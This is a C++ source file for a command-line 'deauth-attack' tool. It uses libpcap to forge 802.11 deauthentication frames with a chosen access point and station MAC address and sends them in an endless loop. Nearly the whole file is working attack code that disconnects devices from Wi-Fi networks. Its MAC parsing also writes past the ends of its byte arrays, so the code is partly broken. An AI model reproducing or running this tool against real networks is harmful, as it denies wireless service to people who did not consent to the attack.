#include <pcap.h>
#include<iostream>
#include<cstring>
#include<unistd.h>

void usage()
{
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");

}

uint8_t deauth[]={
	0x00,0x00,0x0c,0x00,0x04,0x80,0x00,0x00,0x02,0x00,0x18,0x00,0xc0,0x00,0x3a,0x01,
	0xff,0xff,0xff,0xff,0xff,0xff,
	0xff,0xff,0xff,0xff,0xff,0xff,
	0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x07,0x00
};

uint8_t AP[6],station[6];
bool type=false;

int main(int argc, char** argv)
{
	if(argc<3||argc>5){
		usage();
		return -1;
	}
	sscanf(argv[2],"%x:%x:%x:%x:%x:%x",AP,AP+1,AP+2,AP+3,AP+4,AP+5);
	if(argc>=4)
		sscanf(argv[3],"%x:%x:%x:%x:%x:%x",station,station+1,station+2,station+3,station+4,station+5);
	if(argc>=5)
		type=!strcmp("-auth",argv[4]);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}
	memcpy(deauth+0x1c,AP,6);
	if(type)
	{
		if(argc>=4)memcpy(deauth+0x16,station,6);
		memcpy(deauth+0x10,AP,6);
	}
	else
	{
		if(argc>=4)memcpy(deauth+0x10,station,6);
		memcpy(deauth+0x16,AP,6);
	}
	while (true) {
		pcap_sendpacket(pcap,deauth,sizeof(deauth));
		usleep(1000000);
	}
	pcap_close(pcap);
}
